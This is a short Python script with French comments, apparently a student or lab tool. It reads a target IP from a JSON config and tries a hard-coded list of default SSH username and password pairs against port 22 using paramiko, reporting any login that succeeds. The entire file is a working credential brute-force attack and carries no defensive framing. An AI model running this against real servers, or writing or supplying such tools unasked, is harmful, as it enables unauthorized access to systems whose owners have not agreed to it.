import paramiko
import json

json_file_path = 'conf.json'  # Chemin vers le fichier JSON contenant l'adresse IP à scanner

def get_ip_from_json(json_file_path):
    try:
        with open(json_file_path) as json_file:
            data = json.load(json_file)
            target = data.get('IP')
            return target
    except Exception as e:
        print(f"Error reading JSON file: {e}")
        return None

def brute_force_ssh(hostname, port, username, password):
    try:
        # Création d'un objet SSHClient
        client = paramiko.SSHClient()

        # Ajout de la clé publique du serveur à la liste des clés connues
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connexion au serveur SSH
        client.connect(hostname, port, username, password)

        # Si la connexion réussit, afficher un message de succès
        print(f"\033[1;31;40mConnexion SSH réussie avec {username}/{password}")

        # Fermeture de la connexion SSH
        client.close()

        return True

    except paramiko.AuthenticationException:
        # Si l'authentification échoue, afficher un message d'échec
        print(f"Échec de l'authentification avec {username}/{password}")
        return False

def main_bruteforce():
    # Obtention de l'adresse IP à scanner depuis le fichier JSON
    target = get_ip_from_json(json_file_path)
    if target is None:
        print("Impossible de récupérer l'adresse IP à partir du fichier JSON.")
        return

    # Informations de connexion SSH
    hostname = target
    port = 22

    # Tentatives d'authentification
    credentials = [("admin", "admin"), ("admin", "root"), ("root", "admin"), ("demo","sdv92")]
    tentative = 0
    print(tentative)
    for username, password in credentials:
        tentative = 0
        if brute_force_ssh(hostname, port, username, password):
            # Si l'authentification réussit, sortir de la boucle
            tentative = 1 
            print(tentative)
            break

